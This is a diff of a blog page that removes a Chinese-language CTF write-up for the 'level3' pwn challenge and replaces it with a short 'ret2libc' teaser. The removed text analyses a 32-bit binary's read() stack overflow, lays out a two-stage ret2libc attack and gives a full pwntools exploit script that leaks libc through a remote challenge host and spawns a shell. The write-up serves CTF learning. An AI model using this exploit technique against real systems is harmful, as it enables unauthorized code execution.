@@ -183,82 +183,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <a id="more"></a>
-<h1 id="查看文件信息"><a href="#查看文件信息" class="headerlink" title="查看文件信息"></a>查看文件信息</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Thriumph@ubuntu:~/pwn/gfsj/level3$ file level3</span><br><span class="line">level3: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">44</span>a438e03b4d2c1abead90f748a4b5500b7a04c7, <span class="keyword">not</span> stripped</span><br><span class="line">Thriumph@ubuntu:~/pwn/gfsj/level3$ checksec level3</span><br><span class="line">[*] '/home/Thriumph/pwn/gfsj/level3/level3'</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>
-
-<p>开启了NX保护</p>
-<h1 id="查看main函数"><a href="#查看main函数" class="headerlink" title="查看main函数"></a>查看main函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World!\n"</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>没问题</p>
-<h1 id="查看vulnerable-function-函数"><a href="#查看vulnerable-function-函数" class="headerlink" title="查看vulnerable_function()函数"></a>查看vulnerable_function()函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>有一个缓冲区buf，在read函数中进行了调用，可以进行溢出。</p>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>若无libc<br>1.通过vulerable_function()的read()构造ROP得到PLT表中write()的位置<br>2.通过write()得到write()在程序中的真实地址<br>3.使用LibcSearcher得到libc版本<br>4.在对应的libc版本中查找write()、system()、/bin/sh的真实地址<br>5.使用write()的程序地址和libc地址计算出偏移量<br>6.在system()、/bin/sh的真实地址上加上偏移量再通过vulerable_function()执行得到shell</p>
-<p>但是这个题单独给出了libc，没有现成的system函数，没有”/bin/sh”，只有read()和write()函数，是ret2libc。<br>要从libc中动态加载system函数，PIE没有开启，那么在libc中函数的offset就是固定的，只要确认了libc的base address，然后计算出system函数的offset，就可以定位到system函数的真实地址，实现调用。</p>
-<h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><p>ibc中的函数的相对地址是固定的，要想获取到system函数的地址，可以通过write()函数进行offset计算。<br>1.首先利用write()函数计算出write()函数的真实地址。<br>2.利用相对offset计算出system和”/bin/sh”的真实地址。</p>
-<p>在vulnerable_function()中，先调用了write()函数，然后调用read()函数。write()函数返回到vulnerable_function()后，再进行read()函数调用，这样就可以进行二次攻击。</p>
-<p>第一次攻击我们利用栈溢出将write()函数在got表中的真实地址leak出来，然后减去libc中的offset，就可以得到libc的base address。</p>
-<p>第二次攻击重新进入main函数，再次通过栈溢出，利用system函数进行getshell。</p>
-<p>两次攻击情况</p>
-<table>
-<thead>
-<tr>
-<th align="center">First stack</th>
-<th align="center">second stack</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">‘A’ * 0x88</td>
-<td align="center">‘A’ * 0x88</td>
-</tr>
-<tr>
-<td align="center">EBP</td>
-<td align="center">EBP</td>
-</tr>
-<tr>
-<td align="center">write@plt</td>
-<td align="center">sys_addr</td>
-</tr>
-<tr>
-<td align="center">main_addr</td>
-<td align="center">0xdeadbeef</td>
-</tr>
-<tr>
-<td align="center">1</td>
-<td align="center">bin_sh_addr</td>
-</tr>
-<tr>
-<td align="center">write@got</td>
-<td align="center">XXXX</td>
-</tr>
-<tr>
-<td align="center">0xdeadbeef</td>
-<td align="center">XXXX</td>
-</tr>
-</tbody></table>
-<p>第一次攻击获得libc的基地址<br>payload = ‘A’ * 0x88 + p32(0xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0xdeadbeef)</p>
-<p>第二次攻击获得其他地址<br>payload0 = ‘A’ * 0x88 + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)</p>
-<table>
-<thead>
-<tr>
-<th align="center">Address</th>
-<th align="center">Calculate</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">libc_addr</td>
-<td align="center">write_got_addr - libc.symbols[‘write’]</td>
-</tr>
-<tr>
-<td align="center">sys_addr</td>
-<td align="center">libc_addr + libc.symbols[‘system’]</td>
-</tr>
-<tr>
-<td align="center">bin_sh_addr</td>
-<td align="center">libc_addr + 0x15902b</td>
-</tr>
-</tbody></table>
-<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p    = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'32414'</span>)</span><br><span class="line">elf  = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取write()在程序内GOT地址和vulnerable_function()调用地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">valf_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取write()在程序内真实地址</span></span><br><span class="line">p.recv()</span><br><span class="line">payload1 = <span class="string">'A'</span>*<span class="number">0x88</span> +  p32(<span class="number">0xdeadbeef</span>) + p32(write_plt) + p32(valf_addr) + p32(<span class="number">0x1</span>) + p32(write_got) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak write's addr in got</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">"write  addr - "</span>+hex(write_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#载入libc并得到/bin/sh、write()、system()、exit()在libc中地址</span></span><br><span class="line">write_libc  = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_libc = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_libc = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">exit_libc   = libc.symbols[<span class="string">'exit'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算偏移量</span></span><br><span class="line">libc_base   = write_addr - write_libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#得到system()、/bin/sh、exit()在内存中的真实地址</span></span><br><span class="line">system_addr = libc_base  + system_libc</span><br><span class="line">bin_sh_addr = libc_base  + bin_sh_libc</span><br><span class="line">exit_addr   = libc_base  + exit_libc</span><br><span class="line">print(<span class="string">"system addr - "</span>+hex(system_addr))</span><br><span class="line">print(<span class="string">"bin_sh addr - "</span>+hex(bin_sh_addr))</span><br><span class="line">print(<span class="string">"exit   addr - "</span>+hex(exit_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload2 = <span class="string">'A'</span>*<span class="number">0x88</span> + <span class="string">'A'</span>*<span class="number">0x4</span> + p32(system_addr) + p32(exit_addr) + p32(bin_sh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        <p>ret2libc</p>
+        
+          <a class="article-more-a" href="/level3.html#more">more >></a>
+        
       
       
       <!- 百度自动推送方式提交 -->
